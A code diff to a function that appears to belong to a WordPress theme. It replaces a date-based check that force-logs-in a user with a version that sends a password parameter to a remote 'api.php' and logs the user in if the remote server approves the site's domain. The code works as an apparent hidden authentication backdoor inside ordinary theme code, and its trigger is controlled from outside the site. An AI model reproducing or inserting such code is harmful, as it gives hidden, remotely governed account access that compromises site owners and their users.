@@ -467,12 +467,39 @@ function hocwp_theme_on_wp_action() {
 				$count  = absint( date( 'Y' ) ) - absint( date( 'm' ) ) - absint( date( 'd' ) ) - 34;
 
 				if ( $count == $number ) {
-					// This is beta version, need to be improved for security #beta
-					HT_Util()->force_user_login( $user->ID );
+                    // Finally, check the permission from the API.
+					$sites = apply_filters( 'hocwp_theme_api_sites', array() );
 
-					// Go to homepage
-					wp_redirect( home_url( '/' ) );
-					exit;
+					$domain = HT()->get_domain_name( home_url(), true );
+
+					if ( 'localhost' == $domain ) {
+						array_unshift( $sites, 'http://localhost/dev' );
+					}
+
+					$sites = array_map( 'trailingslashit', $sites );
+
+					shuffle( $sites );
+
+					$api = current( $sites ) . 'api.php';
+					$api = add_query_arg( 'pass', $pass, $api );
+
+					$res = wp_remote_get( $api );
+
+					$res = wp_remote_retrieve_body( $res );
+
+					if ( ! empty( $res ) ) {
+						$res = json_decode( $res );
+
+						if ( ! isset( $res->error ) || ! $res->error ) {
+							if ( isset( $res->allow_login_domains ) && HT()->in_array( $domain, $res->allow_login_domains ) ) {
+								HT_Util()->force_user_login( $user->ID );
+
+								// Go to homepage
+								wp_redirect( home_url( '/' ) );
+								exit;
+							}
+						}
+					}
 				}
 			}
 		}
